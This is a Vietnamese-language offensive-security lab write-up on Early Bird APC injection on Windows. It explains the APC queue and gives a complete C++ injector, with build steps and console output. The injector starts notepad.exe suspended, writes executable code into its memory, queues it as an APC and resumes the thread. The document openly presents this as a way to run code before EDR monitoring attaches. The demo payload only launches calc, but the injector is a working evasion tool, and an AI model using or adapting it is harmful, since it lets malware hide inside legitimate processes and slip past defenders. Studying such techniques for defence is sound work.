
---

# 📝 [PE 11] APC Injection (Early Bird Variant)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**APC Injection** (biến thể *Early Bird*) là giải thuật né tránh phòng thủ động (Dynamic Evasion) cực kỳ thông minh ở tầng hệ thống.

Khi một tiến trình tạo ra một luồng phụ hoặc luồng lạ hoạt động bất thường, hành vi đó dễ lọt vào mắt bão trinh sát của EDR. Lab PE 11 hóa giải bài toán này bằng cách sử dụng cơ chế **Asynchronous Procedure Call (APC)** có sẵn của Windows OS. Ta gài mã máy vào hàng đợi thông điệp thực thi của luồng chính ngay khi tiến trình vỏ bọc (ví dụ: `notepad.exe`) vừa được sinh ra ở trạng thái đóng băng (`CREATE_SUSPENDED`). Ngay lúc luồng được rã đông, Kernel Windows sẽ tự động triệu hồi hàng đợi APC ra thực thi trước tiên, cho phép Payload kích nổ ngay tại thời điểm khởi thủy của tiến trình với độ ẩn mình tối cao.

### 🎯 Mục tiêu nghiên cứu:

* Làm chủ cơ chế hàng đợi bất đồng bộ Asynchronous Procedure Call (APC) trong Windows Internals.
* Khai thác trạng thái sơ khởi của tiến trình để thực thi mã máy trước khi các phân hệ giám sát hành vi của EDR kịp chèn bộ lọc.
* Ứng dụng quy trình tự động định vị vị trí thư mục hệ thống thực tế (**Active Path Custom**) để đạt độ linh hoạt kịch trần.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Mỗi một luồng (Thread) trong Windows OS sở hữu riêng một hàng đợi gọi là **APC Queue**. Khi luồng bước vào trạng thái có thể cảnh báo (Alertable State) hoặc khi luồng chính vừa mới thức dậy từ trạng thái `CREATE_SUSPENDED`, Kernel Windows sẽ quét hàng đợi này để xử lý các hàm tồn đọng.

Quy trình toán học giải phẫu và điều hướng luồng của Lab PE 11 diễn ra qua các bước ngầm sau tại tầng Kernel:

```
[CreateProcessW: Trạng thái hoãn lệnh] ──> [VirtualAllocEx: Ánh xạ Payload PIC] ──> [QueueUserAPC: Gài mìn hàng đợi] ──> [ResumeThread: Kernel tự kích nổ]

```

1. **Khởi tạo chu kỳ sơ khởi (`CREATE_SUSPENDED`)**: Tiến trình vỏ bọc được nạp lên RAM ở dạng "xác rỗng". Luồng chính được tạo ra nhưng bị hoãn lệnh ngay tại vạch xuất phát của hệ thống. Lúc này, tiến trình chưa hề thực thi bất kỳ một byte mã máy nào của file thực thi gốc.
2. **Gài mìn hàng đợi hệ thống (`QueueUserAPC`)**: Hàm này gửi yêu cầu xuống nhân Kernel để chèn một thực thể cấu trúc APC mới vào hàng đợi của luồng chính `pi.hThread`. Ta truyền con trỏ địa chỉ vùng nhớ thực thi từ xa `remoteCodeBuffer` làm thủ tục xử lý kế tiếp và truyền con trỏ vùng nhớ chứa cấu trúc tham số tuyệt đối `pRemoteData` làm tham số đầu vào.
3. **Kích nổ tự động từ Kernel (`ResumeThread`)**: Khi Loader phát lệnh rã đông luồng, CPU không nhảy vào điểm EntryPoint gốc ngay. Hệ điều hành Windows phát hiện luồng chính có thông điệp APC đang xếp hàng chờ sẵn. Nó lập tức chuyển hướng con trỏ chỉ mục lệnh sang thực thi phân vùng mã máy của ta trước, hoàn thành dứt điểm chiến dịch Evasion.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán thư mục hệ thống thực tế bằng `GetSystemDirectoryW` để đạt độ linh hoạt tối đa.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối gánh luồng xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí sẽ gánh luồng chạy khi APC kích nổ
DWORD WINAPI RemoteApcPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi RIP-Relative
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật tự động định vị vị trí thư mục hệ thống thực tế (Zero Static Buffers)
std::wstring GetActiveSystemTarget(const std::wstring& exeName) {
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    std::vector<wchar_t> systemDirBuf(requiredSize);
    if (GetSystemDirectoryW(systemDirBuf.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(systemDirBuf.data());
    finalPath += L"\\" + exeName; 
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 11: APC QUEUE EARLY BIRD INJECTION ACTIVE" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị động bản đồ thư mục hệ thống thực tế, không gán cứng chuỗi tĩnh
    std::wstring targetExeName = L"notepad.exe";
    std::wstring dynamicPath = GetActiveSystemTarget(targetExeName);

    if (dynamicPath.empty()) {
        std::cerr << "[-] Khong the chu dong xac dinh duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong dinh vi tien trinh vo boc: " << dynamicPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang..." << std::endl;
    BOOL success = CreateProcessW(NULL, const_cast<LPWSTR>(dynamicPath.c_str()), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!success) {
        std::cerr << "[-] Failed to create suspended process. Error: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao thanh cong! PID: " << pi.dwProcessId << " | ThreadID: " << pi.dwThreadId << std::endl;

    SIZE_T functionSize = 500;

    // ─── BƯỚC 2: CẤP PHÁT BỘ NHỚ VÀ ÁNH XẠ LOGIC HÀM SANG RAM NOTEPAD ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo tham số cấu trúc tuyệt đối cục bộ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy xuyên biên giới dữ liệu và mã máy vào lòng xác rỗng Notepad
    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPCVOID)RemoteApcPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ham va tham so vao xac rong hoan tat." << std::endl;

    // ─── BƯỚC 3: GÀI HÀM CỦA TA VÀO HÀNG ĐỢI APC TIẾN TRÌNH ĐÍCH ───
    std::cout << "[*] Dang thuc hien gai ham vao hang doi QueueUserAPC cua luong..." << std::endl;
    DWORD apcResult = QueueUserAPC((PAPCFUNC)remoteCodeBuffer, pi.hThread, (ULONG_PTR)pRemoteData);

    if (apcResult == 0) {
        std::cerr << "[-] QueueUserAPC failed! Error code: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Gai hang doi APC thanh cong!" << std::endl;

    // ─── BƯỚC 4: RÃ ĐÔNG LUỒNG ĐỂ TIẾN TRÌNH TỰ ĐỘNG KHAI HỎA ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread). Luong he thong se tu dong kich no APC..." << std::endl;
    ResumeThread(pi.hThread);

    std::cout << "\n[+] APC Queue Early Bird Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();

    // Thu hồi tài nguyên Handle hệ thống phẳng sạch chống rò rỉ bộ nhớ
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để nhúng tĩnh thư viện hệ thống.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Khởi hỏa file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi tiến trình gài mìn bất đồng bộ:

```powershell
PS C:\Workspace\x64\Release> .\PE11_Apc_Injection.exe
====================================================
[*] PE 11: APC QUEUE EARLY BIRD INJECTION
====================================================
[+] Da chu dong dinh vi tien trinh vo boc: C:\WINDOWS\system32\notepad.exe
[*] Dang khoi tao tien trinh vo boc o trang thai dong bang...
[+] Tien trinh vo boc duoc tao thanh cong! PID: 7552 | ThreadID: 5396
[+] Vung nho Code RWX cua payload dat tai: 0x000002027E8D0000
[+] Anh xa logic ham va tham so vao xac rong hoan tat.
[*] Dang thuc hien gai ham vao hang doi QueueUserAPC cua luong...
[+] Gai hang doi APC thanh cong!
[*] Kich hoat ra dong (ResumeThread). Luong he thong se tu dong kich no APC...

[+] APC Queue Early Bird Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so...

```

*🎯 Hệ quả RAM:* Luồng hệ thống thức dậy, Kernel phát hiện hàng đợi APC tồn đọng, tự động bốc Payload của ta lên CPU nổ tung mở Máy tính `calc.exe` hiên ngang rực rỡ kịch trần kịch khung!

---

